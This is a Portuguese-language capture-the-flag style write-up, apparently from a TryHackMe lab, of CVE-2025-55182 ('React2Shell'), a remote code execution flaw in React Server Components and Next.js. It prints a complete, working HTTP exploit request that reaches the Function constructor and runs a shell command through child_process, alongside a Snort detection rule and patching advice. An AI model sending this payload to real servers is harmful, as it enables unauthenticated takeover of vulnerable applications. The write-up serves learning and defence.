Write-up: CVE-2025-55182 - React Server Components RCE (React2Shell)
Este repositÃ³rio contÃ©m a demonstraÃ§Ã£o e explicaÃ§Ã£o tÃ©cnica da vulnerabilidade CVE-2025-55182 (conhecida como React2Shell), explorada durante o laboratÃ³rio prÃ¡tico do TryHackMe. Esta falha afeta o React Server Components (RSC) e frameworks como Next.js, permitindo ExecuÃ§Ã£o Remota de CÃ³digo (RCE) sem autenticaÃ§Ã£o.

ðŸ“ DescriÃ§Ã£o da Vulnerabilidade
A vulnerabilidade Ã© uma deserializaÃ§Ã£o insegura no protocolo React Flight. O erro ocorre na funÃ§Ã£o requireModule do pacote react-server-dom-webpack, que utiliza notaÃ§Ã£o de colchetes para acessar propriedades de objetos. Isso permite que um atacante percorra a prototype chain e acesse o construtor global Function, injetando comandos arbitrÃ¡rios no servidor Node.js.

VersÃµes VulnerÃ¡veis:

React: 19.0.0, 19.1.0, 19.1.1, 19.2.0

Next.js: VersÃµes recentes atÃ© a correÃ§Ã£o em 19.0.1+

ðŸš€ ExploraÃ§Ã£o Passo a Passo
1. PreparaÃ§Ã£o do Ambiente
O ataque Ã© realizado interceptando e modificando uma requisiÃ§Ã£o HTTP via Burp Suite.

Header CrÃ­tico: Next-Action: x (Gatilha o processamento de Server Actions do React)

Content-Type: multipart/form-data

2. ConfiguraÃ§Ã£o do Burp Suite
No Burp Suite, utilizamos o Repeater para enviar o payload malicioso.

ConfiguraÃ§Ã£o de uma nova aba HTTP no Repeater.

3. O Payload Malicioso
O payload simula um objeto "chunk" falso que manipula as propriedades internas do React:

HTTP
POST / HTTP/1.1
Host: [TARGET_IP]:3000
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"
"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"
[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
Por que funciona?

$1:constructor:constructor: Resolve para o construtor global Function.

_prefix: ContÃ©m o cÃ³digo JavaScript que serÃ¡ executado pelo construtor.

execSync('id'): Comando do Sistema Operacional para identificar o usuÃ¡rio.

4. ExecuÃ§Ã£o e Resultado
Ao configurar os detalhes do alvo (Host e Porta) e enviar a requisiÃ§Ã£o, o servidor executa o comando e retorna a saÃ­da no campo digest da resposta HTTP.

![Resultado do RCE](uploaded:Screenshot from 2026-01-16 22-23-02.png-469c595a-f8ef-4be0-ab57-01d69ec1b5a8) SaÃ­da do comando id exibida na resposta do servidor.

ðŸ›¡ï¸ DetecÃ§Ã£o e MitigaÃ§Ã£o
DetecÃ§Ã£o via Snort (IDS)
Podemos identificar tentativas de ataque monitorando headers e padrÃµes de payload:

Snippet de cÃ³digo
alert http any any -> $LAN_NETWORK any (
    msg:"Potential Next.js React2Shell / CVE-2025-55182 attempt";
    content:"Next-Action"; http_header; nocase;
    content:"multipart/form-data"; http_header; nocase;
    pcre:"/\"then\"\s*:\s*\"\$1:__proto__:then\"/s";
    sid:6655001; rev:1;)
RemediaÃ§Ã£o
Atualizar: Certifique-se de estar usando React 19.0.1+ ou versÃµes corrigidas do Next.js.

WAF: Implementar regras de Web Application Firewall que filtrem acessos a propriedades como __proto__ e constructor em payloads JSON/Multipart.

## ðŸ”— ReferÃªncias e Ferramentas

* **TryHackMe Room:** [React2Shell (CVE-2025-55182)](https://tryhackme.com/room/react2shellcve202555182)
* **PoC Original:** [maple3142 - CVE-2025-55182.http](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http)
* **Scanner de Vulnerabilidade:** [Next.js-RSC-RCE-Scanner (CVE-2025-66478)](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478)

POC Original por maple3142

Scanner de Vulnerabilidade por Malayke

Aviso: Este conteÃºdo possui fins exclusivamente educacionais e foi realizado em ambiente controlado.
